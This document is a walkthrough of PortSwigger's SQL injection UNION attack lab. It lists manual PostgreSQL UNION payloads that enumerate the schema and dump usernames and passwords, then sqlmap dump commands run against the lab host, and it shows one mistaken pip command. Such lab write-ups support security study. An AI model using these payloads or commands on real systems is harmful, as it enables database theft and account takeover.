\+ Lab #5    : SQL injection UNION attack, retrieving data from other tables\
\+ Lab Level : Practitioner\
\+ Link      : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## About:
This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.<br/>
The database contains a different table called ```users```, with columns called ```username``` and ```password```. 
To solve the Lab, perform a [SQL injection UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) to retrieve all usernames and passwords.

## End Goal: 
Log in as the ```administrator``` user.

## Detection:
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an internal error
* The resulting query sent by the App to the back-end databases should look to something like:
```SQL
SELECT * FROM products WHERE category = 'Gifts''
```
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## Exploitation:
### Manual:
> 📝: **HACK STEPS:** <br/>
> 1° Determine the number of columns that are being returned by the original query <br/>
> 2° Determine the columns that contains string data <br/>
> 3° Retrieve the database version <br/>
> 4° Retrieve the current database name <br/>
> 5° Fetch database (schema) names <br/>
> 6° Fetch the tables for the current database <br/>
> 7° Fetch the columns for a specific table in the current database <br/>
> 8° Dump data. <br/>

#### Number of columns:
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Start by injecting the ```category``` parameter with ```Gifts'+UNION+SELECT+NULL--``` which will return an error
4. And then ```Gifts'UNION+SELECT+NULL,NULL--``` which will return the results of the original query (Selecting content for product ```Gifts```) <br/>
> 📍 ***The number of columns is then ```2```***

#### Columns containing text:
1. Inject the ```category``` parameter with the following payload ```'+UNION+SELECT+'a',NULL--``` <br/>
      => If an ```Internal Server Error``` occurs, then the first column does not contain string type data.
2. And then, inject the vulnerable parameter with ```'+UNION+SELECT+NULL,'a'--``` <br/>
      => If an ```Internal Server Error``` is returned, then the second column does not contain string type data.

> 📍 ***In this Lab, both columns contain text.*** 

#### Database version: 
Each ```DBMS``` (Database Management System) has its own syntax to retrieve the version, and since we don't know which one we are dealing with, let's try the most popular ones.
Here is a great [Cheat-Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) you can refer to when exploiting SQL injection:<br/>

:bulb: **Cheat-Sheet:** <br/>
1. Oracle: <br/>
```SQL
SELECT banner FROM v$version
```
```SQL
SELECT version FROM v$instance
```
2. Microsoft & MySQL: <br/>
```SQL
SELECT @@version
```
3. PostgreSQL <br/>
```SQL
SELECT version()
```
> In this Lab, the back-end DBMS is ```PostgreSQL```<br/>

* Let's retrieve the database version, by sending the following payload: ```'+UNION+SELECT+NULL,version()--```
![Retrieving the version](https://user-images.githubusercontent.com/101610095/220288617-b05e864a-2e5f-454e-9bf7-8c129bbd5de4.png)

#### Current database name: 
* Retrieving the current database name syntax for ```PostgreSQL``` DBMS: 
```SQL
SELECT current_database()
```
* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,current_database()--```
![CurrentDB_name](https://user-images.githubusercontent.com/101610095/220291423-76f2c3a0-aaf9-4a32-8b51-b92e3a3ab821.png)

#### Databases names: 
* Retrieving databases names syntax for ```PostgreSQL``` DBMS: 
```SQL
SELECT datname FROM pg_database
```
* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong> ```'+UNION+SELECT+NULL,datname+FROM+pg_database--```
![Databases_names](https://user-images.githubusercontent.com/101610095/220293746-3d8f24d7-c8d7-431d-b929-373cc9976154.png)

#### Fetching the tables for the current database:
* Listing tables syntax for ```PostgreSQL``` DBMS: 
```SQL
SELECT table_name FROM information_schema.tables
```
* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--```
![Tables](https://user-images.githubusercontent.com/101610095/220296661-edb318ff-5ac2-49c6-824a-9c2cd2d7187b.png)<br/>
* This payload will return all the tables in the current database, and since we know the name of the table is ```users```, let's add a filter to our payload using the ```LIKE``` clause:br/>
* Payload: ```'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+WHERE+table_name+LIKE+'users'--```
![users_table](https://user-images.githubusercontent.com/101610095/220298815-0b415f32-7c27-4ce1-941a-c4e23147fff6.png)

#### Fetching columns for the table users in the current database:
* Listing columns syntax for ```PostgreSQL``` DBMS: 
```SQL
SELECT column_name FROM information_schema.columns WHERE table_name='TableName'
```
* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'--```
![Columns](https://user-images.githubusercontent.com/101610095/220299713-b3e5ad20-5d70-4be1-a89d-f67746a8ec8e.png)

#### Dumping data from users table:
* We can retrieve the content of ```users``` table by sending the following payload: ```'+UNION+SELECT+username,password+FROM+users--``` 
![Dump](https://user-images.githubusercontent.com/101610095/220300804-b80049a3-c05f-4310-8dd1-9e1deca52305.png)

#### Solving the Lab: 
* Now that we have dumped the credentials, we can go to ```/login``` and login as the ```Administrator``` user and solve the lab !!
![Login](https://user-images.githubusercontent.com/101610095/220303361-b14f6ed2-b4b9-432a-941c-24db7a428184.png)

### Automated:
#### SQLmap:

##### Fetching Databases names:
* Command:  
```bash
sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 --dbs --batch
```
* Options: <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --proxy=http://127.0.0.1:8080 : Using BurpSuite proxy for debugging purposes <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -u : Target URL <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -p : Testable parameter <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --technique=U : SQL Injection technique to use. Here i'm using the UNION technique <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --threads : Maximum number of concurrent HTTP requests (default 1) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --level : Level of test to perform (5 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --risk : Risk of test to perform (3 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --dbs : Enumerate databases (schema) names <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --batch : Never ask for user input, use the default behavior <br/>

* Execution:
![SQLMap_1](https://user-images.githubusercontent.com/101610095/220312739-645d4223-81ca-4ef9-b413-977a79cdf9ce.png) <br/>
> :memo: ***Here the database ```public``` is the one we are interested in.***

##### Fetching tables for database: 'public':
* Command:
```shell
sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public --tables --batch
```
* Options: <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --tables : Enumerating database tables <br/>

* Execution: <br/>
![sqlmap_2](https://user-images.githubusercontent.com/101610095/220314044-2082729c-fe77-4806-971b-f04bae465756.png)

##### Fetching columns for table 'users' in database 'public':
* Command:  
```bash
sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public -T users --columns --batch
```
* Options: <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --columns : Enumerating database table columns <br/>

* Execution: <br/>
![sqlmap_3](https://user-images.githubusercontent.com/101610095/220316231-52c2d7aa-01ea-40b5-8bdd-122f2ae322f9.png)

##### Dumping data from table 'users' in database 'public':
* Command:  
```bash
sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public -T users --dump --batch 
```

* Options: <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --dump : Dump database table entries <br/>

* Execution: <br/>
![sqlmap_4](https://user-images.githubusercontent.com/101610095/220315870-2a6abc2b-9898-4237-a738-b08f71fd3616.png)

#### Python3:
* Refer to https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%235/Lab-5.py
* Requirements:
```bash
pip3 install -m requirements.txt
```
* Help Menu: 
```bash
$ python3 Lab-5.py --help
usage: Lab-5.py [-h] -u URL [-n]

Usage Example: python3 Lab-5.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab-5](https://user-images.githubusercontent.com/101610095/220834052-c54932eb-4486-4110-a5cb-08a4f19d349e.gif)

